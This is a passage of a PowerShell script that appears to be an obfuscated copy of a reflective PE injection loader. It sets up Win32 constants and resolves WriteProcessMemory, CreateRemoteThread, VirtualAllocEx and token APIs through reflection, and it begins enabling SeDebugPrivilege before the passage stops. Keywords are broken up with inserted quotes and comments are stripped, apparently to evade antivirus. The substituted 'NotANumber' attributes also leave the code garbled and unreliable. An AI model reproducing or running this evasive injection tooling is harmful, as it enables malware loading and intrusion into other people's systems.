		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	F'u'N'c'T'i'O'n' Get-Win32Constants
	{
		$Win32Constants = N'e'W'-'o'B'j'E'c'T' System.Object
		
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	F'u'N'c'T'i'O'n' Get-Win32F'u'N'c'T'i'O'n's
	{
		$Win32F'u'N'c'T'i'O'n's = N'e'W'-'o'B'j'E'c'T' System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($memcpyAddr, $memcpyDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($memsetAddr, $memsetDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
        ## comment ; ##
        if (([Environment]::OSVersion.Version -ge (N'e'W'-'o'B'j'E'c'T' 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (N'e'W'-'o'B'j'E'c'T' 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32F'u'N'c'T'i'O'n's | a'D'd'-'m'E'm'B'e'R' NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32F'u'N'c'T'i'O'n's
	}
	## comment ; ##
	F'u'N'c'T'i'O'n' Sub-SignedIntAsUnsigned
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				## comment ; ##
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	F'u'N'c'T'i'O'n' A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				## comment ; ##
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	F'u'N'c'T'i'O'n' Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	F'u'N'c'T'i'O'n' Convert-UIntToInt
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	F'u'N'c'T'i'O'n' Test-MemoryRangeValid
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[NotANumber(NotANumberSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	F'u'N'c'T'i'O'n' w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y
	{
		Param(
			[NotANumber(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[NotANumber(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	## comment ; ##
	F'u'N'c'T'i'O'n' Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [NotANumber( Position = 0)]
	        [Type[]]
	        $NotANumbers = (N'e'W'-'o'B'j'E'c'T' Type[](0)),
	        
	        [NotANumber( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = N'e'W'-'o'B'j'E'c'T' System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $NotANumbers)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $NotANumbers)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    W'r'i't'e'-'O'u't'p'u't' $TypeBuilder.CreateType()
	}


	## comment ; ##
	F'u'N'c'T'i'O'n' Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [NotANumber( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [NotANumber( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    ## comment ; ##
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    ## comment ; ##
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    ## comment ; ##
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = N'e'W'-'o'B'j'E'c'T' IntPtr
	    $HandleRef = N'e'W'-'o'B'j'E'c'T' System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    ## comment ; ##
	    W'r'i't'e'-'O'u't'p'u't' $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	F'u'N'c'T'i'O'n' Enable-SeDebugPrivilege
	{
		Param(
		[NotANumber(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32F'u'N'c'T'i'O'n's,
		
		[NotANumber(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[NotANumber(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32F'u'N'c'T'i'O'n's.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32F'u'N'c'T'i'O'n's.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32F'u'N'c'T'i'O'n's.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32F'u'N'c'T'i'O'n's.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
